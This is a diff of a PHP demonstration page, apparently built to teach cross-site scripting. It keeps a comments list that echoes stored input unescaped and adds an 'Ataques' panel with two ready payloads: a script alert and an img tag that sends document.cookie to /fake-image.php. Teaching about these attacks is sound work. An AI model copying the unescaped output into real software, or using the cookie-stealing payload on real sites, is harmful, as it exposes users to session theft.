@@ -6,14 +6,14 @@
  * Time: 23:43
  */
 
+session_start();
+
 $pdo = new PDO(
     'sqlite::memory:',
     null,
     null,
     array(PDO::ATTR_PERSISTENT => true)
 );
-
-$pdo->exec("CREATE TABLE IF NOT EXISTS comments (content text)");
 
 if ($_POST) {
 
@@ -61,14 +61,25 @@ INFO;
         }
     ?>
 
-    <h2>Comentarios</h2>
-    <ul>
-        <?php
-            foreach($comments as $comment) {
-                echo "<li>{$comment['content']}</li>";
-            }
-        ?>
-    </ul>
+    <div class="row">
+        <div class="col-md-7">
+            <h2>Comentarios</h2>
+            <ul>
+                <?php
+                    foreach($comments as $comment) {
+                        echo "<li>{$comment['content']}</li>";
+                    }
+                ?>
+            </ul>
+        </div>
+        <div class="col-md-5">
+            <h2>Ataques</h2>
+            <ul>
+                <li><a href='#' onclick='$("#comment").val("Alert<script>alert(\"pillado\");</script>");return false;'>Alert attack</a></li>
+                <li><a href="#" onclick='$("#comment").val("<img src=\"/fake-image.php?c="+document.cookie+"\"/> OK");return false;'>Cookie steal attack</a></li>
+            </ul>
+        </div>
+    </div>
 
 </div>
 <script src="http://code.jquery.com/jquery-2.1.4.min.js"></script>
